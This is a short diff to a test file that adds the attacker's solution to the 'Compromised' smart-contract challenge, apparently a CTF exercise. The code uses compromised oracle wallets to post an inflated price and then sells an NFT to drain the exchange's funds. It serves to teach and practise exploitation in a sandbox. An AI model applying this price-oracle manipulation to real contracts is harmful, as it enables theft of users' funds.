@@ -81,7 +81,12 @@ describe('Compromised challenge', function () {
         await this.exchange.connect(attacker).buyOne({ value: lowPrice })
         const tokenID = 0
 
-
+        //manipulate prices, approve NFT transfer and sell
+        const highPrice = await ethers.provider.getBalance(this.exchange.address)
+        await this.oracle.connect(compromisedWallets[0]).postPrice("DVNFT", highPrice)
+        await this.oracle.connect(compromisedWallets[1]).postPrice("DVNFT", highPrice)
+        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenID)
+        await this.exchange.connect(attacker).sellOne(tokenID)
 
     });
 
